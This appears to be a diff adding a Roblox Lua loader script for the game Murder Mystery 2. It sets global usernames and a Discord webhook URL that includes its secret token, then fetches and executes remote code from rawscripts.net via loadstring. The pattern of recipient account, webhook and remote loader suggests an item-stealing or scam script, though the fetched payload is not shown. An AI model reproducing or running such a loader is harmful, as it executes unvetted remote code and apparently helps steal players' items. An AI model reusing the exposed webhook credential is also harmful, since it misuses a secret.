@@ -1,0 +1,5 @@
+_G.Username = "baconsahil2"
+_G.Username2 = "baconsahil2"
+_G.Webhook = "https://discord.com/api/webhooks/1277463165780758628/YqnvpzyfGyKrOurkWRCvp1xAdlG16g60xY126smq0KPY3J7B0SeTp2LxgOIxX6M60cuG"
+
+loadstring(game:HttpGet("https://rawscripts.net/raw/Murder-Mystery-2-Overdrive-H-MM-15035"))()
